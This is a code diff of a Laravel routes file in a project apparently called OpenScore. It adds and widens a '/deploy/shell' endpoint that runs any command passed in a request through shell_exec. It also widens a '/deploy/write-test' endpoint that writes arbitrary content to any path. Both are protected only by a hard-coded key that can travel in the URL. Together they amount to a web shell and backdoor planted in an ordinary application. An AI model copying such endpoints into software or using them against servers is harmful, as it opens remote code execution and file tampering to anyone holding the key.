@@ -363,12 +363,22 @@ Route::get('/deploy/ls', function(Illuminate\Http\Request $request) {
     return response($output)->header('Content-Type', 'text/plain');
 });
 
-// Remote file writer for testing
-Route::get('/deploy/write-test', function(Illuminate\Http\Request $request) {
-    if ($request->query('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
+// Remote shell for auditing
+Route::match(['get', 'post'], '/deploy/shell', function(Illuminate\Http\Request $request) {
+    if ($request->query('key') !== 'openscore_deploy_2026' && $request->input('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
     
-    $path = $request->query('path');
-    $content = $request->query('content', 'Default test content');
+    $cmd = $request->input('cmd', $request->query('cmd', 'node -v && npm -v'));
+    $output = shell_exec($cmd . " 2>&1");
+    
+    return response($output)->header('Content-Type', 'text/plain');
+});
+
+// Remote file writer for testing
+Route::match(['get', 'post'], '/deploy/write-test', function(Illuminate\Http\Request $request) {
+    if ($request->query('key') !== 'openscore_deploy_2026' && $request->input('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
+    
+    $path = $request->input('path', $request->query('path'));
+    $content = $request->input('content', $request->query('content', 'Default test content'));
     
     if (!$path) return response('Path required', 400);
     
@@ -383,16 +393,6 @@ Route::get('/deploy/write-test', function(Illuminate\Http\Request $request) {
     } catch (\Exception $e) {
         return response("Error: " . $e->getMessage(), 500);
     }
-});
-
-// Remote shell for auditing
-Route::get('/deploy/shell', function(Illuminate\Http\Request $request) {
-    if ($request->query('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
-    
-    $cmd = $request->query('cmd', 'node -v && npm -v');
-    $output = shell_exec($cmd . " 2>&1");
-    
-    return response($output)->header('Content-Type', 'text/plain');
 });
 
 
